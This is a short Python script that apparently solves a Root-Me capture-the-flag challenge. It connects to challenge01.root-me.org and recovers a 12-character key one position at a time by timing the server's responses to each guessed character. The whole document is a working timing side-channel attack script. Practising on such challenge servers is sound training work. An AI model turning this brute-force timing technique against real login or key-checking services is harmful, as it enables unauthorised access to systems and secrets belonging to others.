import socket
import time

HOST = "challenge01.root-me.org"
PORT = 51015

CHARS = "0123456789-"
KEY_LEN = 12
BUF = 1024

def main():
    s = socket.socket()
    s.connect((HOST, PORT))
    try:
        print(s.recv(BUF).decode(errors='ignore'))
    except:
        pass

    key = ""
    for i in range(KEY_LEN):
        best_char = None
        best_time = 0.0
        print(f"Position {i+1} - : '{key}'")
        for c in CHARS:
            attempt = (key + c).ljust(KEY_LEN, "0")
            start = time.time()
            s.sendall(attempt.encode() + b"\n")
            data = s.recv(BUF)
            elapsed = time.time() - start
            print(f"    try {attempt} -> {elapsed:.4f}s")
            if elapsed > best_time:
                best_time = elapsed
                best_char = c
        key += best_char
        print(f"Found: '{best_char}' -> key pour le moment: {key}\n")

    print("key:", key)
    s.close()

if __name__ == "__main__":
    main()
